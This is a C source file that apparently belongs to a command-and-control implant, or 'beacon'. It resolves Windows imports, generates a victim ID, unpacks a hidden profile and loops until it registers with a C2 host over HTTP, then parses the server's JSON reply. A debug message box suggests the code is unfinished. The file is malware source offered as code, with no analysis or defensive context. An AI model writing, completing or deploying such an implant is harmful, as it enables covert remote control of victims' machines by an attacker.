#include "pch.h"
#include "api.h"
#include "jsmn.h"
#include "beacon.h"
#include "transport.h"

API g_Api;
PROFILE g_Profile;
PWCHAR g_lpwId = NULL;
extern HMODULE g_hModule;

BOOL BeaconRegister()
{
    jsmn_parser p;
    jsmntok_t t[128];

    LPVOID lpReply = HttpCallback(
        g_Profile.lpwHost,
        FALSE,
        C2_REGISTER,
        NULL,
        NULL
    );

    if (lpReply != NULL)
    {
        jsmn_init(&p);

        INT iRet = jsmn_parse(
            &p,
            (PCHAR)lpReply,
            strlen((PCHAR)lpReply),
            t,
            sizeof(t) / sizeof(t[0])
        );

        if (iRet < 0)
        {
            return FALSE;
        }

        // should be the first value, don't bother looping
        if (jsoneq( (PCHAR)lpReply, &t[1], "status") == 0 )
        {
            INT iSize = (t[2].end - t[2].start);

            char buf[100];
            sprintf(buf, "%d", iSize);
            MessageBoxA(0, buf, "beacon", NULL);
        }
    }

    return TRUE;
}

VOID Start()
{
    if (!ResolveImports( &g_Api ))
    {
        return;
    }

    if (!GenerateId())
    {
        return;
    }

    if (!UnpackProfile( &g_Profile ))
    {
        return;
    }

    do
    {
        if (BeaconRegister())
        {
            break;
        }

        BeaconSleep();
    } while (TRUE);

    return;
}